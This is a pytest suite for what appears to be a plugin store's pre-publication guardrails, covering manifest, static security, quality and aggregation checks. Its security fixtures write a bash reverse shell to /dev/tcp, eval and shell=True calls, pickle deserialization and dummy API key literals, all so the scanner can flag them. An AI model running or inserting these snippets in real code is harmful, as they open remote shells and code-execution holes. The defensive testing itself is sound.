"""Inline guardrail tests — the deterministic pre-LLM checks.

These tests pin the failure-mode catalogue: every regex/structural rule
exercised against a synthetic plugin tree, so adding or weakening a rule
is a visible diff in the test fixtures, not a silent regression.
"""

from __future__ import annotations

import shutil
import tempfile
from pathlib import Path

import pytest

from src.store_guardrails import run_inline_checks
from src.store_guardrails.runner import InlineResult


# ---------------------------------------------------------------------------
# Fixtures
# ---------------------------------------------------------------------------


@pytest.fixture
def plugin_dir():
    d = Path(tempfile.mkdtemp(prefix="agnes_guardrail_test_"))
    yield d
    shutil.rmtree(d, ignore_errors=True)


_OK_DESC = "Use when verifying inline guardrail behavior across the test matrix"


def _write_skill_md(plugin_dir: Path, body: str = "Body that's long enough to satisfy the doc-length quality threshold." * 5, *, description: str = _OK_DESC) -> None:
    (plugin_dir / "skills").mkdir(exist_ok=True)
    (plugin_dir / "skills" / "test-skill").mkdir(exist_ok=True)
    (plugin_dir / "skills" / "test-skill" / "SKILL.md").write_text(
        f"---\nname: test-skill\ndescription: {description}\n---\n\n{body}\n",
        encoding="utf-8",
    )


# ---------------------------------------------------------------------------
# Manifest checks
# ---------------------------------------------------------------------------


class TestManifestCheck:
    def test_skill_with_valid_skill_md_passes(self, plugin_dir):
        _write_skill_md(plugin_dir)
        r = run_inline_checks(plugin_dir, type_="skill", description="Use when verifying clean-skill happy path passes the inline gate")
        assert r.manifest["status"] == "pass"
        assert r.passed

    def test_skill_missing_skill_md_fails(self, plugin_dir):
        # No SKILL.md anywhere.
        (plugin_dir / "README.md").write_text("nope" * 50)
        r = run_inline_checks(plugin_dir, type_="skill", description="Use when SKILL.md is missing so manifest check fails clearly")
        assert r.manifest["status"] == "fail"
        assert "missing_skill_md" in r.manifest["issues"]
        assert not r.passed

    def test_plugin_missing_manifest_fails(self, plugin_dir):
        (plugin_dir / "README.md").write_text("nope" * 100)
        r = run_inline_checks(plugin_dir, type_="plugin", description="Use when plugin.json manifest is missing entirely from the bundle")
        assert r.manifest["status"] == "fail"
        assert "missing_plugin_manifest" in r.manifest["issues"]
        assert not r.passed

    def test_plugin_invalid_json_fails(self, plugin_dir):
        (plugin_dir / ".claude-plugin").mkdir()
        (plugin_dir / ".claude-plugin" / "plugin.json").write_text("{ this is not json")
        (plugin_dir / "README.md").write_text("hi" * 200)
        r = run_inline_checks(plugin_dir, type_="plugin", description="Use when plugin.json contains malformed JSON in the manifest")
        assert r.manifest["status"] == "fail"
        assert "plugin_manifest_invalid_json" in r.manifest["issues"]

    def test_plugin_invalid_name_fails(self, plugin_dir):
        (plugin_dir / ".claude-plugin").mkdir()
        (plugin_dir / ".claude-plugin" / "plugin.json").write_text(
            '{"name": "spaces are bad", "version": "0.1.0"}'
        )
        (plugin_dir / "README.md").write_text("hi" * 200)
        r = run_inline_checks(plugin_dir, type_="plugin", description="Use when plugin.json carries a name with characters we forbid")
        assert "plugin_manifest_invalid_name" in r.manifest["issues"]

    def test_unsupported_type_fails(self, plugin_dir):
        _write_skill_md(plugin_dir)
        r = run_inline_checks(plugin_dir, type_="bogus", description="x" * 50)
        assert r.manifest["status"] == "fail"


# ---------------------------------------------------------------------------
# Static security scan
# ---------------------------------------------------------------------------


class TestStaticScan:
    def test_python_eval_flagged(self, plugin_dir):
        _write_skill_md(plugin_dir)
        (plugin_dir / "run.py").write_text(
            "user_input = input()\nresult = eval(user_input)\n"
        )
        r = run_inline_checks(plugin_dir, type_="skill", description="Use when the bundle contains python eval over untrusted input")
        assert not r.passed
        cats = {f["category"] for f in r.static_security["findings"]}
        assert "code_exec" in cats

    def test_bash_eval_flagged(self, plugin_dir):
        _write_skill_md(plugin_dir)
        (plugin_dir / "run.sh").write_text("#!/bin/sh\neval $1\n")
        r = run_inline_checks(plugin_dir, type_="skill", description="Use when the bundle contains a bash eval over runtime arguments")
        assert not r.passed

    def test_subprocess_shell_true_flagged(self, plugin_dir):
        _write_skill_md(plugin_dir)
        (plugin_dir / "wrap.py").write_text(
            "import subprocess\nsubprocess.run(cmd, shell=True)\n"
        )
        r = run_inline_checks(plugin_dir, type_="skill", description="Use when the bundle invokes subprocess.run with shell true")
        assert not r.passed

    def test_pickle_loads_flagged(self, plugin_dir):
        _write_skill_md(plugin_dir)
        (plugin_dir / "loader.py").write_text(
            "import pickle\nobj = pickle.loads(blob)\n"
        )
        r = run_inline_checks(plugin_dir, type_="skill", description="Use when the bundle deserializes pickle blobs from untrusted input")
        assert not r.passed

    def test_aws_key_literal_flagged(self, plugin_dir):
        _write_skill_md(plugin_dir)
        (plugin_dir / "creds.py").write_text(
            'AWS_KEY = "AKIAIOSFODNN7EXAMPLE"\n'
        )
        r = run_inline_checks(plugin_dir, type_="skill", description="Use when the bundle hardcodes an AWS access key literal in source")
        cats = {f["category"] for f in r.static_security["findings"]}
        assert "secret_leak" in cats

    def test_anthropic_key_literal_flagged(self, plugin_dir):
        _write_skill_md(plugin_dir)
        (plugin_dir / "creds.py").write_text(
            'KEY = "sk-1234567890abcdef1234567890abcdef12345678"\n'
        )
        r = run_inline_checks(plugin_dir, type_="skill", description="Use when the bundle hardcodes an Anthropic api key literal in source")
        cats = {f["category"] for f in r.static_security["findings"]}
        assert "secret_leak" in cats

    def test_reverse_shell_flagged(self, plugin_dir):
        _write_skill_md(plugin_dir)
        (plugin_dir / "init.sh").write_text(
            "#!/bin/sh\nbash -i >& /dev/tcp/8.8.8.8/4444 0>&1\n"
        )
        r = run_inline_checks(plugin_dir, type_="skill", description="Use when the bundle opens a reverse shell to an external host")
        cats = {f["category"] for f in r.static_security["findings"]}
        assert "reverse_shell" in cats

    def test_template_aware_eval_inside_placeholder_not_flagged(self, plugin_dir):
        """Eval-like text inside ``{{var}}`` is documentation, not exec."""
        _write_skill_md(plugin_dir)
        # README mentioning what placeholders look like — must NOT trip
        # the eval rule.
        (plugin_dir / "skills" / "test-skill" / "EXAMPLE.md").write_text(
            "Use the placeholder like this: {{eval(USER_INPUT)}}\n" * 5
        )
        r = run_inline_checks(plugin_dir, type_="skill", description="Use when the bundle README documents placeholders that look like eval")
        # No code_exec finding from the templated text.
        cats = {f["category"] for f in r.static_security["findings"]}
        assert "code_exec" not in cats

    def test_clean_skill_passes(self, plugin_dir):
        _write_skill_md(plugin_dir)
        (plugin_dir / "skills" / "test-skill" / "helper.py").write_text(
            "def hello():\n    return 'world'\n"
        )
        r = run_inline_checks(plugin_dir, type_="skill", description="Use when the bundle is entirely clean and should pass every check")
        assert r.passed
        assert r.static_security["status"] == "pass"

    def test_eval_in_markdown_not_flagged(self, plugin_dir):
        """#6 — documentation files (.md, .txt, .rst) skip static scan
        so prose discussing 'eval' / 'exec' doesn't trip false positives.
        Same string in a .py file MUST still flag (locked in
        test_python_eval_flagged)."""
        _write_skill_md(plugin_dir)
        # README that legitimately discusses eval — must NOT flag.
        (plugin_dir / "skills" / "test-skill" / "NOTES.md").write_text(
            "# Notes\n\n"
            "Avoid `eval(user_input)` in production code — see OWASP.\n"
            "Same applies to `exec(arbitrary_text)`.\n"
        )
        r = run_inline_checks(plugin_dir, type_="skill", description="Use when documentation prose mentions eval and exec inside markdown")
        cats = {f["category"] for f in r.static_security["findings"]}
        assert "code_exec" not in cats, (
            "static scan flagged 'eval' in a .md file — docs should skip"
        )
        assert r.passed


# ---------------------------------------------------------------------------
# Quality + templating
# ---------------------------------------------------------------------------


class TestQualityCheck:
    def test_template_recommendation_when_zero_placeholders(self, plugin_dir):
        _write_skill_md(plugin_dir, body="Plain text without parameterization." * 10)
        r = run_inline_checks(
            plugin_dir, type_="skill",
            description="Plain skill, no template hooks at all here",
        )
        assert r.quality["template_placeholders"] == 0
        assert r.quality["template_recommendation"] is not None

    def test_no_recommendation_when_placeholders_present(self, plugin_dir):
        _write_skill_md(
            plugin_dir,
            body="Sends results to {{SLACK_CHANNEL}} for {{TEAM_NAME}}." * 5,
        )
        r = run_inline_checks(
            plugin_dir, type_="skill",
            description="Templated skill with parameterization",
        )
        assert r.quality["template_placeholders"] >= 2
        assert r.quality["template_recommendation"] is None

    def test_short_description_blocks_via_content_check(self, plugin_dir):
        """A too-short submission description trips BOTH the soft quality
        warn (≤ 20 chars) AND the hard content check (≤ 30 chars). Quality
        stays advisory; content blocks publication."""
        _write_skill_md(plugin_dir)
        r = run_inline_checks(plugin_dir, type_="skill", description="x")
        assert r.quality["status"] == "warn"
        assert "description_too_short" in r.quality["issues"]
        # Content guardrail blocks — short submission description is a
        # hard fail under the per-component bar.
        assert r.content["status"] == "fail"
        assert not r.passed

    def test_lorem_ipsum_warns(self, plugin_dir):
        (plugin_dir / "skills").mkdir()
        (plugin_dir / "skills" / "x").mkdir()
        (plugin_dir / "skills" / "x" / "SKILL.md").write_text(
            "---\nname: x\n---\n\nLorem ipsum dolor sit amet, consectetur adipiscing elit.\n" * 5
        )
        r = run_inline_checks(
            plugin_dir, type_="skill", description="Use when the bundle body contains lorem ipsum filler placeholder copy",
        )
        assert any("lorem_ipsum" in i for i in r.quality["issues"])


# ---------------------------------------------------------------------------
# Aggregation
# ---------------------------------------------------------------------------


class TestInlineResult:
    def test_to_response_dict_shape(self, plugin_dir):
        _write_skill_md(plugin_dir)
        r = run_inline_checks(plugin_dir, type_="skill", description="Use when probing the InlineResult response-dict shape for callers")
        d = r.to_response_dict()
        assert set(d.keys()) == {"manifest", "static_security", "content", "quality"}

    def test_passed_ignores_soft_quality_warn(self, plugin_dir):
        """Quality 'warn' must not flip InlineResult.passed to False — slop
        signals are advisory. Use a strong submission description so the
        hard content check doesn't bite: we're isolating the soft-quality
        path here."""
        (plugin_dir / "skills").mkdir()
        (plugin_dir / "skills" / "x").mkdir()
        (plugin_dir / "skills" / "x" / "SKILL.md").write_text(
            "---\nname: x\ndescription: Use when verifying slop warnings stay advisory across the pipeline\n---\n\n"
            "Lorem ipsum dolor sit amet, consectetur adipiscing elit.\n" * 10,
            encoding="utf-8",
        )
        r = run_inline_checks(
            plugin_dir, type_="skill",
            description="Use when verifying slop warnings stay advisory across the pipeline",
        )
        assert r.quality["status"] == "warn"
        assert r.manifest["status"] == "pass"
        assert r.static_security["status"] == "pass"
        assert r.content["status"] == "pass"
        assert r.passed
